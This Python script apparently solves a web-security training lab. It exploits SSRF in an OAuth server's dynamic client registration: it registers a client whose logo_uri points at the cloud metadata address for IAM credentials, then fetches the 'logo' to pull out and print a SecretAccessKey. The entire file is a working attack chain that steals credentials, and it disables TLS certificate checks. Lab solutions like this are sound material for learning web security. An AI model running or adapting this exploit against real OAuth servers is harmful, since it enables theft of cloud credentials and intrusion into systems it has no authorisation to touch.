import http.client
import json
import re
import ssl

LAB_ID = "???"


def GET_social_login() -> http.client.HTTPResponse:
    method, path = 'GET', '/social-login'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
    }
    body = ''
    headers['Content-Length'] = str(len(body))
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, path, body, headers)
    return connection.getresponse()


def GET_client_logo(
        oauth_server_id: str,
        client_id: str
) -> http.client.HTTPResponse:
    method, path = 'GET', f'/client/{client_id}/logo'
    host, port = f'oauth-{oauth_server_id}.oauth-server.net', 443
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
    }
    body = ''
    headers['Content-Length'] = str(len(body))
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, path, body, headers)
    return connection.getresponse()


def POST_reg(
        oauth_server_id: str,
) -> http.client.HTTPResponse:
    method, path = 'POST', '/reg'
    host, port = f'oauth-{oauth_server_id}.oauth-server.net', 443
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
        'content-type': 'application/json',
        'upgrade-insecure-requests': '1',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'priority': 'u=0, i',
        'te': 'trailers',
    }
    fields = {
        "redirect_uris": [
            "https://google.com"
        ],
        "logo_uri": "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"
    }
    body = json.dumps(fields)
    headers['Content-Length'] = str(len(body))
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, path, body, headers)
    return connection.getresponse()


response = GET_social_login()
oauth_server_id = re.findall(r'oauth-([a-zA-Z0-9]+).oauth-server', response.read().decode())[0]
response = POST_reg(oauth_server_id)
client_id = json.loads(response.read().decode())["client_id"]
response = GET_client_logo(oauth_server_id, client_id)
secret = json.loads(response.read().decode())["SecretAccessKey"]
print(f"secret: {secret}")
